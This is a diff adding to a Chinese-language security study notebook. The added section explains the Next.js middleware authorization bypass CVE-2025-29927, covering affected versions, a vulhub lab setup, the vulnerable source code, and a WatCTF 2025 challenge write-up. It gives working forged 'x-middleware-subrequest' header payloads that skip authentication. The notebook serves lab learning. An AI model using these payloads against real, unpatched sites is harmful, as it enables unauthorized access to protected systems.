@@ -300,3 +300,150 @@ else {
 所以我们这里可以用换行符，注意要用`%0a`
 
 ![800](assets/Day%203/file-20251220223412787.png)
+
+# Next.js 中间件鉴权绕过漏洞 (CVE-2025-29927)
+## 漏洞描述
+
+CVE-2025-29927 是 Next.js 框架中发现的一个严重授权绕过漏洞。该漏洞允许攻击者通过伪造特定的 HTTP 请求头，绕过中间件中的授权检查，从而未经授权地访问受保护的资源。此问题影响了使用“next start”命令并设置“output: 'standalone'”的自托管 Next.js 应用程序。
+
+Next.js 使用内部头字段“x-middleware-subrequest”来防止递归请求导致的无限循环。攻击者可以通过在请求中伪造该头字段，跳过中间件的执行，从而绕过关键的安全检查，例如授权 Cookie 验证。
+
+**受影响的版本**
+
+==Next.js 15.x < 15.2.3
+
+=Next.js 14.x < 14.2.25
+
+Next.js 13.x < 13.5.9
+
+**影响范围**
+
+使用中间件的自托管 Next.js 应用程序（next start with output： standalone）
+
+依赖 Middleware 进行身份验证或安全检查的应用程序，稍后不会在应用程序中进行验证
+
+## 环境搭建
+
+使用 p 神的[https://github.com/vulhub/vulhub/blob/master/next.js/CVE-2025-29927/README.zh-cn.md](https://github.com/vulhub/vulhub/blob/master/next.js/CVE-2025-29927/README.zh-cn.md)
+
+可以把vulhub都gitclone下来。然后进对应的文件夹`docker-compose up -d`
+
+```Bash
+┌──(root㉿kali)-[/home/…/Desktop/vulhub/next.js/CVE-2025-29927]
+└─# docker-compose up -d
+Creating network "cve-2025-29927_default" with the default driver
+Pulling web (vulhub/nextjs:15.2.2)...
+15.2.2: Pulling from vulhub/nextjs
+6e909acdb790: Pull complete
+d714f4673cad: Pull complete
+be84add755f8: Pull complete
+9a8d89ceeab1: Pull complete
+4c07c1809c8e: Pull complete
+a98958ee95bc: Pull complete
+23bec30f180e: Pull complete
+bf031c299822: Pull complete
+Digest: sha256:d4df62ece026292a8068bf48667fd8ad44b31120237ff302de294da88d7ee018
+Status: Downloaded newer image for vulhub/nextjs:15.2.2
+Creating cve-2025-29927_web_1 ... done
+                                               
+```
+
+![](https://ucnckoaspefs.feishu.cn/space/api/box/stream/download/asynccode/?code=NjdmNzRmMDExNzI4YmIwZjcxYzc4MDFjZWUxNWRlZGRfYnFpd25CeXN1SXd4R01MdU1xVUdDRjA1ZThFQm4wcnpfVG9rZW46Q3pxdGJrWTNmbzE2Rll4ZlpiSGNYRVBUbnhlXzE3NjYyNDEzMzU6MTc2NjI0NDkzNV9WNA)
+
+看到在3000端口启动了对应环境
+
+## 漏洞复现
+
+启动环境后访问`you_ip:3000`
+
+自动重定向到了`/login`路由。
+
+![](https://ucnckoaspefs.feishu.cn/space/api/box/stream/download/asynccode/?code=MjE1ZDU4YzdjMmE5Y2M4NTYxOGYxNjc4NWMyYmRlMTlfekNnWFJmd0VlbFpVZUFTRjN5WlBIOHduQ3c1ODF1c3lfVG9rZW46UGRacGJ0ZmxTb2xlcHR4cDE4M2N2VWF2bm9wXzE3NjYyNDEzMzU6MTc2NjI0NDkzNV9WNA)
+
+需要我们登录，我们可以输入admin：password登录。
+
+  
+
+如果我们不知道密码的情况下，可以利用该漏洞实现越权登录：
+
+我们添加请求头(注意我们要访问的不是login路由，是根目录)
+
+```HTTP
+x-middleware-subrequest:middleware:middleware:middleware:middleware:middleware
+```
+
+![](https://ucnckoaspefs.feishu.cn/space/api/box/stream/download/asynccode/?code=NDJmMTYzM2YyNjBiNGNkNDZiNDJlNWI4MDc5NmQyYzVfNXRXTWQ0Tk56aUZEc1pWWVdpYkphYUl0QVlnRmV0Q2FfVG9rZW46V0VET2JaUEZhbzBmZk94UmNqU2NnbWVibjdmXzE3NjYyNDEzMzU6MTc2NjI0NDkzNV9WNA)
+
+可以看到成功确权访问了admin管理界面
+
+## 漏洞原理
+
+看文章[Next.js 中间件鉴权绕过漏洞 (CVE-2025-29927)-先知社区](https://xz.aliyun.com/news/17406)
+
+关键代码
+
+```JavaScript
+export const run = withTaggedErrors(async function runWithTaggedErrors(params) {
+const runtime = await getRuntimeContext(params)
+const subreq = params.request.headers[`x-middleware-subrequest`]
+const subrequests = typeof subreq === 'string' ? subreq.split(':') : []
+
+const MAX_RECURSION_DEPTH = 5
+const depth = subrequests.reduce(
+  (acc, curr) => (curr === params.name ? acc + 1 : acc),
+  0
+)
+
+if (depth >= MAX_RECURSION_DEPTH) {
+  return {
+    waitUntil: Promise.resolve(),
+    response: new runtime.context.Response(null, {
+      headers: {
+        'x-middleware-next': '1',
+      },
+    }),
+  }
+}
+```
+
+会检查请求头，`x-middleware-subrequest`，并按`:`分割值。
+
+当递归深度大于`MAX_RECURSION_DEPTH = 5`时，会绕过中间件的检查继续后续内容。
+
+中间件：Next.js中可以用于在请求到达 API 路由或页面组件之前执行全局逻辑，比如身份验证、请求拦截、重定向等。就是在执行请求前执行一些动作。（在该环境下就是在请求前进行身份验证）
+
+`x-middleware-subrequest头`：为了防止一直递归调用进入死循环而设计。比如：请求一个地址，发现没有登录，于是跳转到login，但是此时还是没有登录，于是又会调用中间件，这样会造成重复递归调用。此时有`x-middleware-subrequest头`，中间件检测到它，就知道这里已经检测过了，就可以跳过这次检测。
+
+所以我们要伪造请求头`x-middleware-subrequest`：根据检查后面的值为中间件名，而规定中间件名为，所以我们填5个`middleware`即可绕过检测。
+
+他的路径通常在根目录`/middleware`或者src目录`/src/middleware`,所有我们的payload为
+
+```HTTP
+x-middleware-subrequest:middleware:middleware:middleware:middleware:middleware
+```
+
+```HTTP
+x-middleware-subrequest:src/middleware:src/middleware:src/middleware:src/middleware:src/middleware
+```
+
+## [WatCTF 2025 ]Waterloo Trivia Dash
+
+![](https://ucnckoaspefs.feishu.cn/space/api/box/stream/download/asynccode/?code=Mzc2N2NlMTVhYWY3NWNmZDJmM2I1Y2Y2MzYzOWI2ZTZfY3h6S24yTjc2WGY1bTFEVmE3RXBRbWxXMjVnN0JQU0lfVG9rZW46RVc4ZGIzbm5Ob0VxaGV4Vnc3VWNJNEpwblJlXzE3NjYyNDEzMzU6MTc2NjI0NDkzNV9WNA)
+
+答完三道题后得到一个按钮，按了没反应，于是复制连接看一下。
+
+`http://112.124.64.34:3080/admin`，是一个admin路由，抓包看
+
+![](https://ucnckoaspefs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjhkNzdhYjNlNGVhOGQ3YjczZDE3NjYzYWU0YjAwMjhfQkFXWHFFWm9xV2dwTmlrbDFwZWxJTnlYaGFDUjJaQm9fVG9rZW46QUMzVGJobWZ5b044T054MGd4RmNpTTRQbmFjXzE3NjYyNDEzMzU6MTc2NjI0NDkzNV9WNA)
+
+访问之后会307跳转到根路由。
+
+我们信息收集一下
+
+![](https://ucnckoaspefs.feishu.cn/space/api/box/stream/download/asynccode/?code=NjgyZTdjM2JmMGNjMjBlOTExYzRjNGVjY2QyNjJiOWJfVzNNZkQwWVlCYWo3YkxZNnBzbktiTlhDeGMxaEVXc2lfVG9rZW46R1hMOGJBMk1ab0tMTkZ4OTRMZWNGWmxsbmdmXzE3NjYyNDEzMzU6MTc2NjI0NDkzNV9WNA)
+
+发现是Next.js版本15.2.2 < 15.2.3 存在已知的漏洞。我们尝试攻击
+
+![](https://ucnckoaspefs.feishu.cn/space/api/box/stream/download/asynccode/?code=NjFlNWIxODhjZGFjYjQ0NjMxNDFjMGM2ZWNhMDNmNzBfeENkTWZaSWZBZG85UVFMaksxVFpITWI0VWNpUGxPdWhfVG9rZW46WnpGbGJCSmVKb2R5OWZ4bjJ2a2NCSG9GblFnXzE3NjYyNDEzMzU6MTc2NjI0NDkzNV9WNA)
+
+该题的中间件是在src目录下。
